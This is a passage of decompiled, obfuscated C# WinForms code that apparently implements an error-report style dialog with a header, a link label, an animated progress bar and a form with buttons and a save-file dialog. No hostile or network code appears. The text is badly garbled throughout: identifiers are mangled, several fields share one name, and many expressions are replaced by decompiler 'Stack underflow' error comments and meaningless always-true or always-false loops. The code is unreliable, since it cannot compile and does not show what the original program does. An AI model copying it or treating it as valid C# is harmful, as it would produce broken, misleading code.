			int num = ((Size)/*Error near IL_0047: Stack underflow*/).Height - 2;
			int width = _0007_0003._009A_0005(this).Width;
			int height = _0007_0003._009A_0005(this).Height;
			/*Error near IL_007d: Stack underflow*/((object)/*Error near IL_007d: Stack underflow*/, (Pen)/*Error near IL_007d: Stack underflow*/, (int)/*Error near IL_007d: Stack underflow*/, num, width, height - 2);
			_0019_0004._007E_0016_0007(_009D_0003._007E_0095_0006(P_0), _0018_0004._0015_0007(), 0, _0007_0003._009A_0005(this).Height - 1, _0007_0003._009A_0005(this).Width, _0007_0003._009A_0005(this).Height - 1);
			Rectangle rectangle = new Rectangle(_0007_0003._009A_0005(this).Width - _0013_0004._000F_0007(48f * this.m__0001), _0013_0004._000F_0007(11f * this.m__0002), _0013_0004._000F_0007(32f * this.m__0001), _0013_0004._000F_0007(32f * this.m__0002));
			if (this.m__0001 != null)
			{
				_0016_0004._007E_0012_0007(_009D_0003._007E_0095_0006(P_0), this.m__0001, rectangle, new Rectangle(0, 0, 32, 32), (GraphicsUnit)2);
			}
			else if (this.m__0001 != null)
			{
				_001A_0004._007E_0017_0007(_009D_0003._007E_0095_0006(P_0), this.m__0001, rectangle);
				if (this._0001 != null)
				{
					_0016_0004._007E_0012_0007(_009D_0003._007E_0095_0006(P_0), (Image)(object)this._0001, new Rectangle(rectangle.Right - _0013_0004._000F_0007(12f * this.m__0001), rectangle.Bottom - _0013_0004._000F_0007(12f * this.m__0002), _0013_0004._000F_0007(16f * this.m__0001), _0013_0004._000F_0007(16f * this.m__0002)), new Rectangle(0, 0, 16, 16), (GraphicsUnit)2);
				}
			}
		}

		protected override void _0002(EventArgs P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 3
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 2
			//IL_0049: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0005_0003._007E_0097_0005;
				_ = ((_0008)/*Error near IL_000c: Stack underflow*/).m__0001;
				_ = _009E_0003._007E_0096_0006;
				/*Error near IL_0035: Stack underflow*/((object)/*Error near IL_0035: Stack underflow*/);
				new Font((Font)/*Error near IL_003c: Stack underflow*/, (FontStyle)1);
				/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/, (Font)/*Error near IL_0043: Stack underflow*/);
				do
				{
					_ = _0012_0004._0008_0007;
					/*Error near IL_0050: Stack underflow*/((object)/*Error near IL_0050: Stack underflow*/, (EventArgs)/*Error near IL_0050: Stack underflow*/);
				}
				while (false);
			}
			catch
			{
			}
		}

		public _0008()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Expected O, but got Unknown
			try
			{
				this.m__0001.set_FlatStyle((FlatStyle)3);
				((Control)this.m__0001).set_Font(new Font(((Control)this).get_Font(), (FontStyle)1));
			}
			catch
			{
			}
			((Control)this).get_Controls().Add((Control)(object)this.m__0001);
			((Control)this).set_BackColor(SystemColors.Window);
			((Control)this).set_TabStop(false);
			((Control)this).set_Dock((DockStyle)1);
			((Control)this).set_Height(58);
			((Control)this).SetStyle((ControlStyles)75794, true);
			this.m__0001 = global::_0005._0011._0001();
			((Control)this).OnResize(EventArgs.Empty);
		}

		public _0008(string P_0)
			: this()
		{
			((Control)this.m__0001).set_Text(P_0);
		}
	}
}
namespace _0003
{
	internal enum _0007
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _000E
{
	internal sealed class _0006 : Control
	{
		private Label m__0001 = new Label();

		private PictureBox m__0001 = new PictureBox();

		private ToolTip m__0001 = new ToolTip();

		private float m__0001 = 1f;

		private float _0002 = 1f;

		protected override void _0001(EventArgs P_0)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 3
			//IL_0053: Expected F4, but got Unknown
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 3
			//IL_005d: Expected F4, but got Unknown
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0071: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = _0004_0003._0092_0005;
				_ = _0013_0004._000F_0007;
				_ = 112f;
				float num = ((_0006)/*Error near IL_0018: Stack underflow*/).m__0001;
				_003F val = /*Error near IL_0019: Stack underflow*/* num;
				/*Error near IL_0053: Stack underflow*/((float)val);
				_ = _0013_0004._000F_0007;
				_ = 32f;
				float num2 = ((_0006)/*Error near IL_002c: Stack underflow*/)._0002;
				_003F val2 = /*Error near IL_002d: Stack underflow*/* num2;
				/*Error near IL_005d: Stack underflow*/((float)val2);
				new Size((int)/*Error near IL_0064: Stack underflow*/, (int)/*Error near IL_0064: Stack underflow*/);
				/*Error near IL_006b: Stack underflow*/((object)/*Error near IL_006b: Stack underflow*/, (Size)/*Error near IL_006b: Stack underflow*/);
				while (true)
				{
					_ = _0012_0004._0006_0007;
					/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/, (EventArgs)/*Error near IL_0041: Stack underflow*/);
					if (false)
					{
						break;
					}
					if (0 == 0)
					{
						return;
					}
				}
			}
		}

		protected override void _0001(float P_0, float P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (uint.MaxValue != 0)
				{
					((_0006)/*Error near IL_000c: Stack underflow*/).m__0001 = (float)/*Error near IL_000c: Stack underflow*/;
					((_0006)/*Error near IL_0015: Stack underflow*/)._0002 = (float)/*Error near IL_0015: Stack underflow*/;
					_ = _0014_0004._0010_0007;
					/*Error near IL_0057: Stack underflow*/((object)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/);
				}
				while (true)
				{
					_ = _0012_0004._007E_0006_0007;
					EventArgs empty = EventArgs.Empty;
					/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, empty);
					if (0 == 0)
					{
						if (false)
						{
							break;
						}
						if (5u != 0)
						{
							return;
						}
					}
				}
			}
		}

		protected override void _0001(bool P_0)
		{
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 2
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 2
			//IL_0065: Incompatible stack heights: 0 vs 2
			//IL_0068: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if (((_0006)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
				{
					goto IL_000d;
				}
				goto IL_001d;
			}
			goto IL_0032;
			IL_000d:
			_ = global::_000F._007E_0014_0002;
			ToolTip obj = ((_0006)/*Error near IL_0019: Stack underflow*/).m__0001;
			/*Error near IL_0055: Stack underflow*/(obj);
			goto IL_001d;
			IL_0032:
			_ = _0084_0002._0001_0005;
			/*Error near IL_0040: Stack underflow*/((object)/*Error near IL_0040: Stack underflow*/, (byte)/*Error near IL_0040: Stack underflow*/ != 0);
			if (false)
			{
				goto IL_000d;
			}
			if (false)
			{
				goto IL_001d;
			}
			return;
			IL_001d:
			if (((_0006)/*Error near IL_0022: Stack underflow*/).m__0001 != null)
			{
				_ = global::_000F._007E_0014_0002;
				PictureBox obj2 = ((_0006)/*Error near IL_0030: Stack underflow*/).m__0001;
				/*Error near IL_0062: Stack underflow*/(obj2);
			}
			goto IL_0032;
		}

		private void _0001(object P_0, EventArgs P_1)
		{
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0017._0096_0002;
				_0003._0001(107390178);
				/*Error near IL_001d: Stack underflow*/((string)/*Error near IL_001d: Stack underflow*/);
			}
			catch
			{
			}
		}

		public _0006()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			((Control)this).SuspendLayout();
			this.m__0001.set_FlatStyle((FlatStyle)3);
			((Control)this.m__0001).set_Location(new Point(0, 10));
			((Control)this.m__0001).set_Size(new Size(62, 24));
			((Control)this.m__0001).set_Text(_0003._0001(107389952));
			this.m__0001.set_Image((Image)(object)global::_0005._0011._0001(_0003._0001(107390447)));
			((Control)this.m__0001).set_Location(new Point(72, 0));
			((Control)this.m__0001).set_Size(new Size(32, 32));
			this.m__0001.set_SizeMode((PictureBoxSizeMode)1);
			((Control)this.m__0001).add_Click((EventHandler)_0001);
			((Control)this.m__0001).add_Click((EventHandler)_0001);
			((Control)this).add_Click((EventHandler)_0001);
			((Control)this).set_Cursor(Cursors.get_Hand());
			((Control)this).set_TabStop(false);
			((Control)this).set_Size(new Size(112, 32));
			((Control)this).get_Controls().AddRange((Control[])(object)new Control[2]
			{
				(Control)this.m__0001,
				(Control)this.m__0001
			});
			this.m__0001.SetToolTip((Control)(object)this, _0003._0001(107390438));
			this.m__0001.SetToolTip((Control)(object)this.m__0001, _0003._0001(107390438));
			this.m__0001.SetToolTip((Control)(object)this.m__0001, _0003._0001(107390438));
			((Control)this).ResumeLayout(true);
		}
	}
}
namespace _0002
{
	internal sealed class _0008 : Control
	{
		internal int _0001 = 99;

		private readonly Bitmap m__0001 = global::_0005._0011._0001(global::_000E._0003._0001(107391243));

		private readonly Bitmap m__0002 = global::_0005._0011._0001(global::_000E._0003._0001(107390405));

		internal readonly Timer _0001 = new Timer();

		private float m__0001 = 1f;

		private float m__0002 = 1f;

		protected override void _0001(EventArgs P_0)
		{
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 2
			//IL_0049: Incompatible stack heights: 0 vs 1
			if (4u != 0)
			{
				_ = _0012_0004._000E_0007;
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/, (EventArgs)/*Error near IL_0032: Stack underflow*/);
				_ = _008D._0080_0003;
				/*Error near IL_003c: Stack underflow*/((object)/*Error near IL_003c: Stack underflow*/);
				if ((int)/*Error near IL_0019: Stack underflow*/ == 0)
				{
					_ = _008D._0081_0003;
					/*Error near IL_0049: Stack underflow*/((object)/*Error near IL_0049: Stack underflow*/);
					global::_0005._0011._0001((_0008)/*Error near IL_0050: Stack underflow*/, (byte)/*Error near IL_0050: Stack underflow*/ != 0);
				}
			}
		}

		protected override void _0002(EventArgs P_0)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 3
			//IL_0053: Expected F4, but got Unknown
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 3
			//IL_005d: Expected F4, but got Unknown
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0071: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = _0004_0003._0092_0005;
				_ = _0013_0004._000F_0007;
				_ = 250f;
				float num = ((_0008)/*Error near IL_0018: Stack underflow*/).m__0001;
				_003F val = /*Error near IL_0019: Stack underflow*/* num;
				/*Error near IL_0053: Stack underflow*/((float)val);
				_ = _0013_0004._000F_0007;
				_ = 42f;
				float num2 = ((_0008)/*Error near IL_002c: Stack underflow*/).m__0002;
				_003F val2 = /*Error near IL_002d: Stack underflow*/* num2;
				/*Error near IL_005d: Stack underflow*/((float)val2);
				new Size((int)/*Error near IL_0064: Stack underflow*/, (int)/*Error near IL_0064: Stack underflow*/);
				/*Error near IL_006b: Stack underflow*/((object)/*Error near IL_006b: Stack underflow*/, (Size)/*Error near IL_006b: Stack underflow*/);
				while (true)
				{
					_ = _0012_0004._0006_0007;
					/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/, (EventArgs)/*Error near IL_0041: Stack underflow*/);
					if (false)
					{
						break;
					}
					if (0 == 0)
					{
						return;
					}
				}
			}
		}

		protected override void _0001(float P_0, float P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (uint.MaxValue != 0)
				{
					((_0008)/*Error near IL_000c: Stack underflow*/).m__0001 = (float)/*Error near IL_000c: Stack underflow*/;
					((_0008)/*Error near IL_0015: Stack underflow*/).m__0002 = (float)/*Error near IL_0015: Stack underflow*/;
					_ = _0014_0004._0010_0007;
					/*Error near IL_0057: Stack underflow*/((object)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/);
				}
				while (true)
				{
					_ = _0012_0004._007E_0006_0007;
					EventArgs empty = EventArgs.Empty;
					/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, empty);
					if (0 == 0)
					{
						if (false)
						{
							break;
						}
						if (5u != 0)
						{
							return;
						}
					}
				}
			}
		}

		protected override void _0001(bool P_0)
		{
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 2
			//IL_0055: Incompatible stack heights: 0 vs 2
			//IL_005f: Incompatible stack heights: 0 vs 2
			//IL_0062: Incompatible stack heights: 0 vs 1
			while ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				while (0 == 0 || 1 == 0)
				{
					if (((_0008)/*Error near IL_0011: Stack underflow*/).m__0001 != null)
					{
						goto IL_0013;
					}
					goto IL_0024;
					IL_0024:
					if (false)
					{
						goto IL_0013;
					}
					goto IL_0027;
					IL_0013:
					if (4 == 0)
					{
						continue;
					}
					_ = global::_000F._007E_0013_0002;
					Bitmap obj = ((_0008)/*Error near IL_0022: Stack underflow*/).m__0001;
					/*Error near IL_0052: Stack underflow*/(obj);
					goto IL_0024;
				}
				continue;
				IL_0027:
				_ = global::_000F._007E_0014_0002;
				Timer obj2 = ((_0008)/*Error near IL_0033: Stack underflow*/)._0001;
				if (4u != 0)
				{
					/*Error near IL_005c: Stack underflow*/(obj2);
				}
				break;
			}
			_ = _0084_0002._0001_0005;
			/*Error near IL_0069: Stack underflow*/((object)/*Error near IL_0069: Stack underflow*/, (byte)/*Error near IL_0069: Stack underflow*/ != 0);
		}

		protected override void _0001(PaintEventArgs P_0)
		{
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_0182: Incompatible stack heights: 0 vs 2
			//IL_0188: Incompatible stack heights: 0 vs 1
			//IL_0198: Incompatible stack heights: 0 vs 1
			//IL_019e: Incompatible stack heights: 0 vs 3
			//IL_01a8: Incompatible stack heights: 0 vs 1
			//IL_01ae: Incompatible stack heights: 0 vs 1
			//IL_01b4: Incompatible stack heights: 0 vs 6
			//IL_01be: Expected F4, but got Unknown
			//IL_01be: Incompatible stack heights: 0 vs 1
			_ = _0015_0004._0011_0007;
			/*Error near IL_0192: Stack underflow*/((object)/*Error near IL_0192: Stack underflow*/, (PaintEventArgs)/*Error near IL_0192: Stack underflow*/);
			if (((_0008)/*Error near IL_001e: Stack underflow*/).m__0002 != null)
			{
				_ = _0016_0004._007E_0012_0007;
				_ = _009D_0003._007E_0095_0006;
				/*Error near IL_01a8: Stack underflow*/((object)/*Error near IL_01a8: Stack underflow*/);
				_ = ((_0008)/*Error near IL_003e: Stack underflow*/).m__0002;
				_ = 0;
				_ = 0;
				_ = _0013_0004._000F_0007;
				_ = 250f;
				float num = ((_0008)/*Error near IL_0054: Stack underflow*/).m__0001;
				_003F val = /*Error near IL_0055: Stack underflow*/* num;
				/*Error near IL_01be: Stack underflow*/((float)val);
				Rectangle obj = new Rectangle(height: _0013_0004._000F_0007(42f * this.m__0002), x: (int)/*Error near IL_0075: Stack underflow*/, y: (int)/*Error near IL_0075: Stack underflow*/, width: (int)/*Error near IL_0075: Stack underflow*/);
				Rectangle rectangle = new Rectangle(0, 0, 250, 42);
				/*Error near IL_0089: Stack underflow*/((object)/*Error near IL_0089: Stack underflow*/, (Image)/*Error near IL_0089: Stack underflow*/, obj, rectangle, (GraphicsUnit)2);
			}
			if (this.m__0001 != null && this._0001 > 0)
			{
				_001B_0004._007E_0018_0007(_009D_0003._007E_0095_0006(P_0), new Rectangle(_0013_0004._000F_0007(46f * this.m__0001), 0, _0013_0004._000F_0007(165f * this.m__0001), _0013_0004._000F_0007(34f * this.m__0002)));
				_001C_0004._007E_0019_0007(_009D_0003._007E_0095_0006(P_0), (Image)(object)this.m__0001, new Rectangle(_0013_0004._000F_0007((float)(this._0001 - 6) * this.m__0001), _0013_0004._000F_0007(16f * this.m__0002), _0013_0004._000F_0007(40f * this.m__0001), _0013_0004._000F_0007(12f * this.m__0002)), 0, 0, 40, 12, (GraphicsUnit)2);
			}
		}

		private void _0001(object P_0, EventArgs P_1)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			do
			{
				int num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0001;
				((_0008)/*Error near IL_0011: Stack underflow*/)._0001 = num + 11;
				if (((_0008)/*Error near IL_0018: Stack underflow*/)._0001 > 198)
				{
					if (1 == 0)
					{
						continue;
					}
					((_0008)/*Error near IL_002a: Stack underflow*/)._0001 = 0;
				}
				_ = global::_000F._007E_0001_0002;
				/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/);
			}
			while (7 == 0);
		}

		public _0008()
		{
			//IL_0033: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Expected O, but got Unknown
			this._0001.set_Interval(85);
			this._0001.add_Tick((EventHandler)_0001);
			((Control)this).set_Size(new Size(250, 42));
			((Control)this).set_TabStop(false);
			((Control)this).SetStyle((ControlStyles)75794, true);
		}
	}
}
namespace _000F
{
	[CompilerGenerated]
	internal sealed class _0004
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 124)]
		private struct _0002
		{
		}

		internal static readonly _0002 _0001/* Not supported: data(61 00 62 00 63 00 64 00 65 00 66 00 67 00 68 00 69 00 6A 00 6B 00 6C 00 6D 00 6E 00 6F 00 70 00 71 00 72 00 73 00 74 00 75 00 76 00 77 00 78 00 79 00 7A 00 41 00 42 00 43 00 44 00 45 00 46 00 47 00 48 00 49 00 4A 00 4B 00 4C 00 4D 00 4E 00 4F 00 50 00 51 00 52 00 53 00 54 00 55 00 56 00 57 00 58 00 59 00 5A 00 30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00 39 00) */;

		internal static readonly _0001 _0001/* Not supported: data(01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 0E 00 0F 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1A 00 1B 00 1C 00 1D 00 1E 00 1F 00 7F 00 80 00 81 00 82 00 83 00 84 00 86 00 87 00 88 00 89 00 8A 00 8B 00 8C 00 8D 00 8E 00 8F 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9A 00 9B 00 9C 00 9D 00 9E 00 9F 00) */;
	}
}
namespace _0007
{
	internal sealed class _0004 : Form
	{
		private global::_0005._0006 m__0001;

		internal Thread _0001;

		internal CheckBox _0001 = new CheckBox();

		internal Label _0001 = new Label();

		internal Button _0001 = new Button();

		internal Button _0002 = new Button();

		internal Label _0002 = new Label();

		internal global::_0006._0005 _0001 = new global::_0006._0005();

		internal Panel _0001 = new Panel();

		internal Panel _0002 = new Panel();

		internal Button _0003 = new Button();

		internal global::_0002._0008 _0001 = new global::_0002._0008();

		internal global::_0005._0008 _0001 = new global::_0005._0008(global::_000E._0003._0001(107390286));

		internal global::_0005._0008 _0002 = new global::_0005._0008(global::_000E._0003._0001(107390249));

		internal global::_0005._0008 _0003 = new global::_0005._0008(global::_000E._0003._0001(107390220));

		internal global::_0005._0008 _0004 = new global::_0005._0008(global::_000E._0003._0001(107389679));

		internal Button _0004 = new Button();

		internal Button _0005 = new Button();

		internal Button _0006 = new Button();

		internal global::_0004._0008 _0001 = new global::_0004._0008(string.Format(global::_000E._0003._0001(107389658), global::_000E._0003._0001(107395030)));

		internal global::_0004._0008 _0002 = new global::_0004._0008(string.Format(global::_000E._0003._0001(107389537), global::_000E._0003._0001(107395030), global::_000E._0003._0001(107392560)));

		internal global::_000E._0006 _0001 = new global::_000E._0006();

		internal Button _0007 = new Button();

		private bool m__0001;

		internal void _0001(object P_0, EventArgs P_1)
		{
			//IL_006c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0072: Invalid comparison between Unknown and I4
			//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 2
			//IL_00c5: Incompatible stack heights: 0 vs 1
			//IL_00d5: Incompatible stack heights: 0 vs 2
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00ef: Incompatible stack heights: 0 vs 2
			do
			{
				new SaveFileDialog();
				SaveFileDialog val = (SaveFileDialog)/*Error near IL_00b5: Stack underflow*/;
				if (5 == 0)
				{
					continue;
				}
				_ = _0011._007E_0088_0002;
				global::_000E._0003._0001(107392227);
				if (0 == 0)
				{
					/*Error near IL_00cf: Stack underflow*/((object)/*Error near IL_00cf: Stack underflow*/, (string)/*Error near IL_00cf: Stack underflow*/);
				}
				if (6u != 0)
				{
					_ = _0011._007E_0089_0002;
					global::_000E._0003._0001(107390424);
					/*Error near IL_00e9: Stack underflow*/((object)/*Error near IL_00e9: Stack underflow*/, (string)/*Error near IL_00e9: Stack underflow*/);
					_ = _0011._007E_008A_0002;
					string text = global::_000E._0003._0001(107390399);
					/*Error near IL_0065: Stack underflow*/((object)/*Error near IL_0065: Stack underflow*/, text);
				}
				bool num = (int)_0091_0002._007E_001A_0005(val) == 1;
				if (0 == 0)
				{
					bool flag = num;
					num = flag;
				}
				do
				{
					if (num)
					{
						num = global::_0005._0011._0001(this.m__0001, global::_0007._007E_0094(val));
						continue;
					}
					return;
				}
				while (3 == 0);
				global::_000F._0016_0002(this);
			}
			while (false);
		}

		internal void _0002(object P_0, EventArgs P_1)
		{
			//IL_0072: Incompatible stack heights: 0 vs 2
			//IL_0082: Incompatible stack heights: 0 vs 2
			//IL_008c: Incompatible stack heights: 0 vs 2
			//IL_0096: Incompatible stack heights: 0 vs 1
			do
			{
				if (1 == 0)
				{
					continue;
				}
				try
				{
					do
					{
						_ = _0084_0002._007E_0092_0004;
						Panel obj = ((_0004)/*Error near IL_0017: Stack underflow*/)._0001;
						if (0 == 0)
						{
							/*Error near IL_007c: Stack underflow*/(obj, false);
						}
						_ = _0084_0002._007E_0092_0004;
						Panel obj2 = ((_0004)/*Error near IL_002b: Stack underflow*/)._0002;
						/*Error near IL_0089: Stack underflow*/(obj2, true);
						_ = _0084_0002._007E_0092_0004;
						global::_000E._0006 obj3 = ((_0004)/*Error near IL_003b: Stack underflow*/)._0001;
						/*Error near IL_0093: Stack underflow*/(obj3, true);
						if (8u != 0)
						{
							bool num = ((_0004)/*Error near IL_0049: Stack underflow*/).m__0001 != null;
							if (uint.MaxValue != 0)
							{
								bool flag = num;
								num = flag;
							}
							if (!num)
							{
								break;
							}
							global::_0005._0011._0001(this, (ThreadStart)_0001);
						}
					}
					while (6 == 0);
				}
				catch
				{
				}
			}
			while (7 == 0);
		}

		internal void _0003(object P_0, EventArgs P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			_ = global::_000F._0016_0002;
			/*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/);
		}

		internal void _0004(object P_0, EventArgs P_1)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 2
			do
			{
				try
				{
					if (0 == 0)
					{
						bool flag = ((_0004)/*Error near IL_000c: Stack underflow*/)._0001 != null;
						while ((int)/*Error near IL_0015: Stack underflow*/ != 0)
						{
							if (false)
							{
								continue;
							}
							_ = global::_000F._007E_0017_0002;
							Thread thread = ((_0004)/*Error near IL_0024: Stack underflow*/)._0001;
							/*Error near IL_003b: Stack underflow*/(thread);
							break;
						}
					}
				}
				catch
				{
					do
					{
						if (4u != 0)
						{
						}
					}
					while (false);
				}
				_ = global::_000F._0016_0002;
				/*Error near IL_0061: Stack underflow*/((object)/*Error near IL_0061: Stack underflow*/);
			}
			while (1 == 0);
		}

		internal void _0005(object P_0, EventArgs P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			_ = global::_000F._0016_0002;
			/*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/);
		}

		internal void _0006(object P_0, EventArgs P_1)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 3
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = ((_0004)/*Error near IL_0008: Stack underflow*/).m__0001;
			_ = _008D._007E_0082_0003;
			CheckBox obj = ((_0004)/*Error near IL_0014: Stack underflow*/)._0001;
			/*Error near IL_0028: Stack underflow*/(obj);
			((global::_0005._0006)/*Error near IL_001b: Stack underflow*/)._0004 = (byte)/*Error near IL_001b: Stack underflow*/ != 0;
		}

		private void _0001(object P_0, global::_0005._0007 P_1)
		{
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 5
			//IL_0039: Incompatible stack heights: 0 vs 3
			//IL_0040: Incompatible stack heights: 0 vs 1
			do
			{
				try
				{
					if (0 == 0)
					{
						_ = _001E_0004._001B_0007;
						new _0010._0005(_0002);
						_ = new object[2];
						_ = 0;
						((object[])/*Error near IL_0024: Stack underflow*/)[/*Error near IL_0024: Stack underflow*/] = (object)/*Error near IL_0024: Stack underflow*/;
						/*Error near IL_0024: Stack underflow*/;
						_ = 1;
						((object[])/*Error near IL_0029: Stack underflow*/)[/*Error near IL_0029: Stack underflow*/] = (object)/*Error near IL_0029: Stack underflow*/;
						/*Error near IL_0040: Stack underflow*/((object)/*Error near IL_0040: Stack underflow*/, (Delegate)/*Error near IL_0040: Stack underflow*/, (object[])/*Error near IL_0040: Stack underflow*/);
					}
				}
				catch (InvalidOperationException)
				{
					do
					{
						if (4u != 0)
						{
						}
					}
					while (2 == 0);
				}
			}
			while (false);
		}

		private void _0007(object P_0, EventArgs P_1)
		{
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 5
			//IL_0039: Incompatible stack heights: 0 vs 3
			//IL_0040: Incompatible stack heights: 0 vs 1
			do
			{
				try
				{
					if (0 == 0)
					{
						_ = _001E_0004._001B_0007;
						new EventHandler(_0008);
						_ = new object[2];
						_ = 0;
						((object[])/*Error near IL_0024: Stack underflow*/)[/*Error near IL_0024: Stack underflow*/] = (object)/*Error near IL_0024: Stack underflow*/;
						/*Error near IL_0024: Stack underflow*/;
						_ = 1;
						((object[])/*Error near IL_0029: Stack underflow*/)[/*Error near IL_0029: Stack underflow*/] = (object)/*Error near IL_0029: Stack underflow*/;
						/*Error near IL_0040: Stack underflow*/((object)/*Error near IL_0040: Stack underflow*/, (Delegate)/*Error near IL_0040: Stack underflow*/, (object[])/*Error near IL_0040: Stack underflow*/);
					}
				}
				catch (InvalidOperationException)
				{
					do
					{
						if (4u != 0)
						{
						}
					}
					while (2 == 0);
				}
			}
			while (false);
		}

		protected override void _0001(CancelEventArgs P_0)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 2
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 2
